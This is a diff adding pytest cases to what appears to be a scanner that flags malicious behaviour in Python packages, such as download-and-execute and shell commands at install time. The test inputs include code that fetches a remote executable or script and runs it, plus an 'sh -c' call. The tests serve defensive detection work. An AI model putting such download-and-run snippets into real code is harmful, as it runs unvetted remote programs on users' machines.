@@ -97,6 +97,17 @@ def test_download_and_run_a_program():
     assert any(f.rule == "download-exec" and f.critical for f in found)
 
 
+def test_downloading_and_running_later_counts_for_less():
+    found = scan('''
+        import requests, subprocess
+        def update():
+            r = requests.get("https://example.com/tool.exe")
+            subprocess.call(["tool.exe"])
+    ''', role="import")
+    hit = [f for f in found if f.rule == "download-exec"][0]
+    assert hit.value == 25 and not hit.critical
+
+
 def test_exec_of_downloaded_code():
     assert "download-exec" in rules(
         "import urllib.request\nexec(urllib.request.urlopen('https://x/p').read())")
@@ -190,6 +201,25 @@ def test_commands_built_from_variables_count_for_less():
     ''', role="setup")
     points = sorted(f.value for f in found if f.rule == "shell-at-install")
     assert points == [15, 30]
+
+
+@pytest.mark.parametrize(
+    "call",
+    ['subprocess.run(["/bin/sh", "autogen.sh"])', 'subprocess.check_call(["./build_bundled.sh"])',
+     'os.system("twine upload dist/*")', 'subprocess.check_output(["brew", "--prefix"])',
+     'os.system("rm -rf dist")'],
+)
+def test_more_build_commands(call):
+    assert rules(f"import os, subprocess\n{call}", role="setup") == ["shell"]
+
+
+def test_shell_dash_c_is_not_a_build_script():
+    assert "shell-at-install" in rules('import subprocess\nsubprocess.run(["sh", "-c", "id"])',
+                                       role="setup")
+
+
+def test_detecting_pyarmor_is_not_using_it():
+    assert rules("def is_obfuscated(m):\n    return 'pyarmor_runtime' in m.__name__") == []
 
 
 def test_build_tools_in_setup_are_only_a_weak_sign():
